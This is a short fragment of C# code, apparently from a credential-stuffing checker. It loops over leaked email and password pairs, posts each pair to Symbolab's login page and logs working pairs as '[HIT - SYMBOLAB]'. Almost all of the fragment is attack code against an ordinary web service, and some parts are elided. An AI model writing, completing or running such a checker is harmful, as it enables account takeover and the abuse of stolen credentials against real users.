        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              string str1 = "email=" + s[0] + "&password=" + s[1] + "&url=https%3A%2F%2Fwww.symbolab.com%2F%23&remember=false";
              string str2 = httpRequest.Post("https://www.symbolab.com/login", str1, "application/x-www-form-urlencoded").ToString();
              if (str2.Contains("connected") || str2.Contains("jwt"))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - SYMBOLAB] " + s[0] + ":" + s[1], Color.Green);
